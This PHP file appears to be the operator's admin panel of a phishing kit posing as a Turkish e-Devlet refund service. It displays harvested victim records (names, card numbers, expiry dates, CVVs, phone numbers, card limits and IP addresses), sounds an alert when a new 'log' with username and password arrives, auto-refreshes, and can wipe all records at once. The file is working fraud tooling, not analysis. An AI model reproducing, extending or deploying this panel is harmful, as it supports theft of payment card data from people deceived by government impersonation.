<?php
include("baglan.php");

session_start();
header("Cache-control:private");

if($_SESSION['logged'] != "1") {
    header("location:giris.php");
    die(); }

if($_GET['tumsil']==1){

mysql_query("TRUNCATE TABLE ak");

echo "<script>alert('Tüm Kayıtlar Silindi.');</script>";
echo "<script>window.location.href='index.php';</script>";

 	}

	?>

	<?php

		$sorgula = mysql_query("select * from ak WHERE notif='1'") or die("Hata Olustu!");
		while($veri=mysql_fetch_assoc($sorgula))
		{
		if($veri['ses'] == '1'){
			echo '<div id="alerts">
			<audio id="audioplayer" autoplay=true>
			<source src="sound/dww.mp3" type="audio/mpeg">
			Tarayiciniz ses elementlerini desteklemiyor. </audio>
			<li>
			<img src="icons/no.png" align="top" style="float:left; margin-right:2px;" />
			<div><strong>LOG GELDI</strong><br /> <i>'.$veri['kullanici'].'</i><br />  </div> '.$veri['pass'].'
			</li>
			</div>';
			mysql_query("UPDATE ak SET notif='0' WHERE id=".$veri['id']." ");
		}else {

		}
	}
?>



<!DOCTYPE html>
<html lang="tr">
<head>
	<meta charset="UTF-8">
	<title>Yönetim Paneli</title>
	<link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
	<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="refresh" content="5;index.php">
	<style>
	.table {
		margin-bottom: 0px;
	}
	</style>
</head>




<body>
<center><h1>E-devlet İade Sistemi Yönetim Paneli</h1></center>

<center><h3>Wild & Whisky</h3></center>
	<div style="color: #D2691E;" class="col-md-12" >
	<br>






	
<a href="#" class="btn btn-primary" onclick="javascript:if(confirm('Silmek istediğinize emin misiniz ?'))
window.location.assign('?tumsil=1');">Tüm Kayıtları Sil</a><br>



	<div class="well">
	<table class="table">
      <thead>
        <tr>
          <th>İD</th>
          <th>Bulunduğu Sayfa</th>
          <th>Ad Soyad</th>
          <th>CC No</th>
          <th>Skt</th>
		  <th>Cvv</th>
		  <th>Telefon</th>
		  <th>Limit</th>
		  <th>IP</th>
        </tr>
      </thead>
      <tbody>
		<?php
		$calistir = mysql_query("select * from ak order by id DESC") or die("Hata Olustu!");
		while($oku=mysql_fetch_assoc($calistir))
		{ $not=$oku['notif'];
		?>
        <tr <? if ($not=='1'){?>style="background:#FFD429"<? } ?>>
          <th scope="row"><?php echo $oku['id']; ?></th>
          <td style="color:green;"><b><?php echo $oku['durum2']; ?></b></td>
          <td style="color:green;"><b><?php echo $oku['adsoyad']; ?></b></td>
          <td style="color:#FF0000"><b><?php echo $oku['cc_no']; ?></b></td>
          <td style="color:#FF0000"><b><?php echo $oku['cc_ay']; ?></b></td>
          <td style="color:#FF0000"><b><?php echo $oku['cc_cvv']; ?></b></td>
          <td style="color:#FF0000"><b><?php echo $oku['telefon']; ?></b></td>
          <td style="color:#FF0000"><b><?php echo $oku['limitx']; ?> TL</b></td>

		  <td style="color:#000000"><b><?php echo $oku['tarih']; ?></b></td>
		  <td style="color:#000000"><b><?php echo $oku['ip']; ?></b></td>
		  

		  
        </tr>
		<?php } ?>
      </tbody>
    </table>
	<script src="js/bootstrap.min.js"></script>
</body>
</html>